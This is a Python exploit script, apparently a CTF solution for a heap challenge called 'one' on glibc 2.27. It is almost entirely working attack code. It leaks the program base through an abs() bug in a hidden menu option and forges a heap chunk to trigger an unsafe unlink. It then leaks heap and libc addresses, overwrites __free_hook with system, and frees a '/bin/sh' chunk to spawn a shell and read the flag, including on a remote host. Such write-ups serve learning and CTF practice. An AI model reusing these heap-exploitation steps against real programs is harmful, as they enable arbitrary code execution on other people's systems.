# File: exp.py
# Author: raycp
# Date: 2019-06-11
# Description: exp for one, actually it's really simple, just unlink.

from pwn_debug import *


pdbg=""
p=''
membp=""
elf=""
libc=""

#io_file=IO_FILE_plus()
#io_file.show()

def add(content):
    p.recvuntil("command>> ")
    p.sendline("1")
    p.recvuntil("string:")
    p.send(content)

def edit(idx,c_find,c_write):
    p.recvuntil("command>> ")
    p.sendline("2")
    p.recvuntil("string:")
    p.sendline(str(idx))
    p.recvuntil("edit:")
    p.send(c_find)
    p.recvuntil("into:")
    p.sendline(c_write)
    

def show(idx):
    p.recvuntil("command>> ")
    p.sendline("3")
    p.recvuntil("string:")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil("command>> ")
    p.sendline("4")
    p.recvuntil("string:")
    p.sendline(str(idx))



def secret(idx):
    p.recvuntil("command>> ")
    p.sendline(str(0x3124))
    p.recvuntil("(Y/N)")
    p.sendline('Y')
    p.recvuntil("test?")
    p.sendline(str(idx))

def pwn(remote):
    
    #pdbg.bp(0x1122)
    ## step 1 abs vuln to leak.
    secret(0x80000000)
    p.recvuntil("string:\n")
    leak_pro=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    pro_base=leak_pro-0x2030c0
    log.info("leak pro base: 0x%x"%(pro_base))
    arrar_ptr=pro_base+0x2030C0
    log.info("array ptr: 0x%x"%(arrar_ptr))
    
    add('\x00') #0
    add('\x00') #1

    for i in range(2,20):
        add('/bin/sh\x00')

    # step 2 build a fake chunk with size 0x30 and the next chunk's prev size to 0x30 and size t0 0x440, and prev inuse bit to 0, ready to unlink
    payload=p64(0)+p64(0x31)+p64(arrar_ptr+8-0x18)+p64(arrar_ptr+8-0x10)+p64(0)*2+p64(0x30)#+p64(0x80)
    pad=''
    for i in range(len(payload)):
        pad+=chr(i+0xa0)
    for i in range(len(payload)):
        edit(1,'\x00',pad[i])
    
    edit(1,'\x00','\x04')
    edit(1,'\x41\n','\x40')
    payload=payload[::-1]
    pad=pad[::-1]
    for i in range(len(payload)):
        edit(1,pad[i]+'\n',payload[i])
    #pdbg.bp(0x1568)

    # step 3 unlink happened, the global ptr point to its address -0x18
    delete(2)

    # step 4 leak heap address
    for i in range(16):
        edit(1,'\x00','a')
    show(1)
    p.recvuntil("a"*0x10)
    leak_heap=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
    heap_base=leak_heap-0x350
    log.info("heap base: 0x%x"%(heap_base))

    # step 5 overwrite the 0 array ptr to unsorted bin and leak libc address
    edit(1,'\x50\n','\xa0')
    show(0)
    p.recvuntil("is:\n")
    leak_libc=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
    libc_base=leak_libc-libc.symbols['main_arena']-0x60
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: 0x%x"%(libc_base))

    # step 6 overwrite the 0 array ptr to free_hook, and write system to free_hook
    find=p64(heap_base+0x3a0)[:6]
    payload=p64(free_hook)[:6]
    find=find[::-1]
    payload=payload[::-1]
    for i in range(0,6):
        edit(1,find[i]+'\n',payload[i])
    payload=p64(system_addr)
    for i in range(6):
        edit(0,'\x00',payload[i])
    #pdbg.bp(0x1568)

    # step 7 trigger free to get shell.
    delete(5)

    if remote:
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        return flag
    else:
        #p.interactive()
        p.sendline("echo '12345'")
        p.recvuntil("12345\n")
        p.sendline('cat flag')
        flag=p.recvuntil("\n")
        print flag
        p.interactive() 
        flag=None

    return flag



def run_exp(ip,port,remote):
    global pdbg
    global p
    global membp
    global elf
    global libc
    pdbg=pwn_debug("./one")

    pdbg.context.terminal=['tmux', 'splitw', '-h']

    pdbg.local()
    pdbg.debug("2.27")
    pdbg.remote(ip, port)
    #p=pdbg.run("local")
    #p=pdbg.run("remote")
    
    if not remote:
        p=pdbg.run("debug")
        #p=pdbg.run("local")
        membp=pdbg.membp
    else:
        p=pdbg.run("remote")

    elf=pdbg.elf
    libc=pdbg.libc
    
    flag=pwn(remote)
   
    return flag

if __name__ == '__main__':
    #pwn()
    run_exp("0",0,0)


